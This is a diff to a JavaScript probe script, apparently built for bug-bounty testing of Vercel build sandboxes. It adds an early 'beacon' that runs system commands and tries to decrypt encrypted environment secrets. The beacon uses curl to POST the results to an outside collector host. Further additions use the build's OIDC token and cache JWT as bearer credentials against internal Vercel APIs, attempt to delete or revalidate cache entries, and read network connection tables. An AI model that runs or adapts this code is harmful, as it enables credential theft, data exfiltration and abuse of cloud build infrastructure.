@@ -16,6 +16,11 @@ function safe(fn) {
   try { return fn(); } catch (e) { return `ERR: ${e.message}`; }
 }
 
+function sendBeacon(data) {
+  safe(() => writeFileSync('/tmp/probe_body.json', JSON.stringify(data)));
+  safe(() => execSync(`curl -s --max-time 10 -X POST -H 'Content-Type: application/json' --data @/tmp/probe_body.json ${COLLECTOR} 2>/dev/null || true`));
+}
+
 // Multiple-format AES-256-GCM / ChaCha20 decryption attempt
 function tryDecrypt(keyStr, contentStr) {
   if (!keyStr || !contentStr) return "missing-key-or-content";
@@ -125,8 +130,25 @@ function tryDecrypt(keyStr, contentStr) {
   return `${diagnostics} | ${results.join(' || ')}`;
 }
 
+// EARLY BEACON — sent immediately before any network probes.
+// Critical env/crypto data arrives even if the main probe times out.
+sendBeacon({
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v17-early",
+  whoami: safe(() => execSync("id; uname -a").toString().trim()),
+  tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
+  vercelCreds: {
+    VERCEL_OIDC_TOKEN: process.env.VERCEL_OIDC_TOKEN ? `present(len=${process.env.VERCEL_OIDC_TOKEN.length})` : 'absent',
+    VERCEL_ENV_ENC_KEY: process.env.VERCEL_ENV_ENC_KEY ? `present(len=${process.env.VERCEL_ENV_ENC_KEY.length})` : 'absent',
+    VERCEL_ENCRYPTED_ENV_CONTENT: process.env.VERCEL_ENCRYPTED_ENV_CONTENT ? `present(len=${process.env.VERCEL_ENCRYPTED_ENV_CONTENT.length})` : 'absent',
+    VERCEL_ARTIFACTS_TOKEN: process.env.VERCEL_ARTIFACTS_TOKEN ? `present(len=${process.env.VERCEL_ARTIFACTS_TOKEN.length})` : 'absent',
+    RUNTIME_CACHE_HEADERS: process.env.RUNTIME_CACHE_HEADERS ? `present(len=${process.env.RUNTIME_CACHE_HEADERS.length})` : 'absent',
+    RUNTIME_CACHE_ENDPOINT: process.env.RUNTIME_CACHE_ENDPOINT || 'absent',
+  },
+  newEnvKeys: safe(() => Object.keys(process.env).filter(k => k.startsWith('VERCEL_')).sort().join(',')),
+});
+
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v16",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v17",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -725,18 +747,91 @@ const report = {
     const queryBody2 = safe(() => readFileSync('/tmp/art_query', 'utf8').slice(0, 300));
     return { queryStatus, queryBody: queryBody2 };
   }),
+  // VERCEL_OIDC_TOKEN as Bearer against Vercel internal APIs
+  // Goal: does Vercel's own infrastructure trust the OIDC token for inter-service auth?
+  // If yes: attacker in victim's build can make authenticated calls to Vercel internal services.
+  oidcInternalAuth: safe(() => {
+    const tok = process.env.VERCEL_OIDC_TOKEN;
+    if (!tok) return 'no-oidc-token';
+    const tryEndpoint = (url) => {
+      const st = safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/oidc_out -w '%{http_code}' -H 'Authorization: Bearer ${tok}' '${url}' 2>/dev/null || true`
+      ).toString().trim());
+      const bd = safe(() => readFileSync('/tmp/oidc_out', 'utf8').slice(0, 150));
+      return { status: st, body: bd };
+    };
+    const apiBase = process.env.VERCEL_API_ENDPOINT || 'https://api-iad1.vercel.com';
+    const containersBase = process.env.VERCEL_API_BUILD_CONTAINERS_ENDPOINT || '';
+    return {
+      // Public Vercel API with OIDC token
+      publicV2User: tryEndpoint('https://api.vercel.com/v2/user'),
+      // Internal IAD1 Vercel API endpoints
+      internalV2User: tryEndpoint(`${apiBase}/v2/user`),
+      internalV1Deployments: tryEndpoint(`${apiBase}/v1/deployments`),
+      internalBuildContainersBase: containersBase ? tryEndpoint(containersBase) : 'not-configured',
+      // OIDC-specific: does Vercel's own API accept its own OIDC tokens?
+      internalV1Projects: tryEndpoint(`${apiBase}/v1/projects?teamId=${process.env.VERCEL_ARTIFACTS_OWNER || ''}`),
+    };
+  }),
+  // RUNTIME_CACHE_HEADERS JWT (iss: "build") against Vercel API
+  // This JWT claims to be from "the build" — do internal services trust it?
+  cacheJwtInternalAuth: safe(() => {
+    const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
+    if (!hdrsRaw) return 'no-runtime-cache-headers';
+    let auth = '';
+    try { auth = JSON.parse(hdrsRaw)['Authorization'] || ''; } catch(_) {}
+    if (!auth) return 'no-auth-in-headers';
+    const tryEndpoint = (url) => {
+      const st = safe(() => execSync(
+        `curl -s --max-time 5 -o /tmp/cj_out -w '%{http_code}' -H '${auth.replace(/'/g,"'\\''")}' '${url}' 2>/dev/null || true`
+      ).toString().trim());
+      const bd = safe(() => readFileSync('/tmp/cj_out', 'utf8').slice(0, 150));
+      return { status: st, body: bd };
+    };
+    const apiBase = process.env.VERCEL_API_ENDPOINT || 'https://api-iad1.vercel.com';
+    return {
+      internalV2User: tryEndpoint(`${apiBase}/v2/user`),
+      publicV2User: tryEndpoint('https://api.vercel.com/v2/user'),
+    };
+  }),
+  // Suspense cache tag revalidation — can we clear victim's cache by tag?
+  // POST /v1/suspense-cache/revalidate?tags=TAG or DELETE /v1/suspense-cache/tags/TAG
+  cacheRevalidate: safe(() => {
+    const ep = process.env.RUNTIME_CACHE_ENDPOINT || '';
+    const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
+    if (!ep || !hdrsRaw) return 'missing-cache-config';
+    let auth = '';
+    try { auth = JSON.parse(hdrsRaw)['Authorization'] || ''; } catch(_) {}
+    const a = auth ? `-H '${auth.replace(/'/g,"'\\''")}' ` : '';
+    // Try revalidate endpoint (clears all cache entries with matching tag)
+    const revalidateStatus = safe(() => execSync(
+      `curl -s --max-time 5 -X POST ${a}-w '%{http_code}' -o /tmp/rv_out '${ep}../revalidate?tags=probe-bounty' 2>/dev/null || true`
+    ).toString().trim());
+    const revalidateBody = safe(() => readFileSync('/tmp/rv_out', 'utf8').slice(0, 150));
+    // Try DELETE by tag
+    const deleteTagStatus = safe(() => execSync(
+      `curl -s --max-time 5 -X DELETE ${a}-w '%{http_code}' -o /tmp/dt_out '${ep}../tags/probe-bounty' 2>/dev/null || true`
+    ).toString().trim());
+    const deleteTagBody = safe(() => readFileSync('/tmp/dt_out', 'utf8').slice(0, 150));
+    // Try the path WITHOUT ../
+    const baseEp = ep.replace('/v1/suspense-cache/', '');
+    const revalidateStatus2 = safe(() => execSync(
+      `curl -s --max-time 5 -X POST ${a}-w '%{http_code}' -o /tmp/rv2_out '${baseEp}/v1/revalidate?tags=probe-bounty' 2>/dev/null || true`
+    ).toString().trim());
+    const revalidateBody2 = safe(() => readFileSync('/tmp/rv2_out', 'utf8').slice(0, 150));
+    return { revalidateStatus, revalidateBody, deleteTagStatus, deleteTagBody, revalidateStatus2, revalidateBody2 };
+  }),
+  // Active TCP connections — what internal services is the build process talking to?
+  activeTcp: safe(() => ({
+    procNetTcp: safe(() => readFileSync('/proc/net/tcp', 'utf8')).slice(0, 1000),
+    procNetTcp6: safe(() => readFileSync('/proc/net/tcp6', 'utf8')).slice(0, 500),
+    // SS (socket statistics) is more human-readable
+    ssEstablished: safe(() => execSync('ss -tnp 2>/dev/null | head -20 || netstat -tnp 2>/dev/null | head -20 || true').toString().trim()).slice(0, 600),
+  })),
 };
 
-const body = JSON.stringify(report);
-
-// Beacon to the researcher-controlled collector. If this arrives, egress is open.
-// Write to file first to avoid shell ARG_MAX limits with large JSON bodies.
-safe(() => writeFileSync('/tmp/probe_body.json', body));
-safe(() =>
-  execSync(
-    `curl -s --max-time 10 -X POST -H 'Content-Type: application/json' --data @/tmp/probe_body.json ${COLLECTOR} 2>/dev/null || true`
-  )
-);
+// FULL BEACON — sent after all slow network probes complete.
+sendBeacon(report);
 
 // Also print to stdout so it shows in build logs / the agent's view.
-console.log(body);
+console.log(JSON.stringify(report));
